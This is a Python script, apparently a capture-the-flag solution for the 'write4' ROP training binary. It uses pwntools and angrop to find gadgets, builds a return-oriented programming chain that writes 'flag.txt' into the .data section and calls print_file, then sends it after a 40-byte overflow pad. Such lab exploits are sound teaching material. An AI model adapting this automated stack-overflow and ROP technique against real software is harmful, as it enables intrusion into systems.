from pwn import *
import angr
import angrop
import logging

logging.getLogger('angr').setLevel(logging.WARNING)
logging.getLogger('angrop').setLevel(logging.WARNING)
logging.getLogger('os').setLevel(logging.WARNING)
logging.getLogger('pwnlib').setLevel(logging.WARNING)

p = process('./write4')
e = ELF('./write4')
r = ROP(e)

print("\n[+] Statically analyzing binary")
print("------------------------------------")
print_flag = e.sym['print_file']
print("[+] The print_file() call is located at %s" % hex(print_flag))

data_section = e.get_section_by_name(".data").header.sh_addr
print("[+] The data section is located at %s" % hex(data_section))

flag_txt = b'flag.txt'

print("\n[+] Analyzing binary with angr_rop")
print("------------------------------------")
angr_p = angr.Project('./write4')
rop = angr_p.analyses.ROP()
rop.find_gadgets_single_threaded()

print("\n[+] Constructing chain to write 'flag.txt' to the data section of the binary")
print("------------------------------------")
write_chain = rop.write_to_mem(data_section, flag_txt)
write_chain.print_payload_code()

print("\n[+] Constructing chain to call print_file(data_section)")
print("------------------------------------")
call_chain = rop.func_call(print_flag, [data_section])
call_chain.print_payload_code()

print("\n[+] Throwing exploit")
print("------------------------------------")
pad = b'A'*40
chain = write_chain.payload_str() + call_chain.payload_str()
p.sendline(pad+chain)
p.interactive()
